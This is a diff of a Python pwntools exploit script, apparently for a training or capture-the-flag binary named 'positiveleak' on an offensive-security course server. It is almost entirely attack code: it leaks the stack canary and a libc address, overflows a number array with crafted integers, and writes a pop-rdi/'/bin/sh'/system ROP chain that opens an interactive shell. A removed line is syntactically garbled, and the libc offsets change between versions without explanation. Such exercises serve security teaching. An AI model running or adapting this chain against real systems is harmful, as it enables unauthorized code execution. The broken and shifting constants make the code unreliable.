@@ -73,13 +73,7 @@ def leak_canary(r, buffer):
     r.recvrepeat(timeout=0.2)
     return canary
 
-def compute_system(libc_base):
-   return libc_base & 0x7f7b0a2280000 50d60
-
-def compute_bin_sh(libc_base):
-    return libc_base + 0x1d8698
-
-def leak_libc_base(r, buffer, canary, sRIP):
+def leak_libc(r, buffer, canary, sRIP):
     r.sendline(b"0")
     time.sleep(0.2)
     r.sendline(b"14")                   # add 14 numbers
@@ -109,45 +103,44 @@ def leak_libc_base(r, buffer, canary, sRIP):
     r.sendline(b"1")
     time.sleep(0.2)
     r.recvlines(17)
-    libc_base = int(r.recvlineS(keepends=False)) - 0x1d90
+    leak_libc = int(r.recvlineS(keepends=False))
     r.recvrepeat(timeout=0.2)
-    return libc_base
+    return leak_libc
 
 if args["REMOTE"]:
-	r = remote("bin.offdef.jinblack.it", 3003)
+	r = remote("bin.training.offdef.it", 3003)
 else:
     r = process("./positiveleak")
-    if args["DEBUG"]:
-        gdb.attach(r, f"""
-        b {add_numbers}
-        unset env
-        set disable-randomization off
-        c
-        """)
-        input("wait")
 
 context.terminal = ['tmux', 'splitw', '-h']
 #context.log_level = "error"
 
 # breakpoints
-add_numbers = "add_numbers:167"
 
 #gadgets
-pop_rdi = 0x000000000002a3e5
+pop_rdi = 0x2a3e5
+pop_rax_rdx_rbx = 0x90528
+pop_rsi = 0x2be51
+syscall = 0x29db4
+one_gadget = 0x50a37
+bin_sh = 0x1d8698
+
 
 buffer = leak_buffer(r)
 sRIP_main = leak_sRIP_main(r)
 canary = leak_canary(r, buffer)
-libc_base = leak_libc_base(r, buffer, canary, sRIP_main)
-libc_system = compute_system(libc_base)
-libc_bin_sh = compute_bin_sh(libc_base)
-libc_pop_rdi = libc_base + pop_rdi
+leak_libc = leak_libc(r, buffer, canary, sRIP_main)
+libc_one_gadget = leak_libc + 0x26ca7
+libc_system = leak_libc + 0x26fd0 
+libc_bin_sh = leak_libc + 0x1ae908
+libc_pop_rdi = leak_libc + 0x655
+libc_pop_rax_rdx_rbx = leak_libc + 0x66798
+libc_pop_rsi = leak_libc + 0x20c1
+libc_syscall = leak_libc + 0x24
 print("buffer:\t", hex(buffer))
 print("sRIP:\t", hex(sRIP_main))
 print("canary:\t", hex(canary))
-print("libc_base:\t", hex(libc_base))
-print("libc_system:\t", hex(libc_system))
-print("libc_bin_sh:\t", hex(libc_bin_sh))
+print("leak_libc:\t", hex(leak_libc))
 
 r.sendline(b"0")
 time.sleep(0.2)
@@ -158,7 +151,7 @@ for i in range(9):
     time.sleep(0.2)
 r.sendline(b"42949672959")          # i = 9
 time.sleep(0.2)
-r.sendline(b"85899345919")          # temp_numbers = 19
+r.sendline(str(0x13ffffffff).encode())         # temp_numbers = 17
 time.sleep(0.2)
 r.sendline(b"")                     # number
 time.sleep(0.2)
@@ -168,15 +161,11 @@ r.sendline(str(canary).encode())    # canary
 time.sleep(0.2)
 r.sendline(b"")                     # sRBP (main)
 time.sleep(0.2)
-r.sendline(str(pop_rdi).encode())   # sRIP (main) / gadget
+r.sendline(str(libc_pop_rdi).encode())   # sRIP (main) / gadget
 time.sleep(0.2)
-r.sendline(str(libc_bin_sh).encode()) # sRBP (__libc_call_main)
+r.sendline(str(libc_bin_sh).encode())
 time.sleep(0.2)
-r.sendline(str(libc_system).encode()) # on top of sRIP (__libc_call_main)
+r.sendline(str(libc_system).encode())
 time.sleep(0.2)
-r.sendline(b"")
-time.sleep(0.2)
-
-gdb.attach(r)
 
 r.interactive()
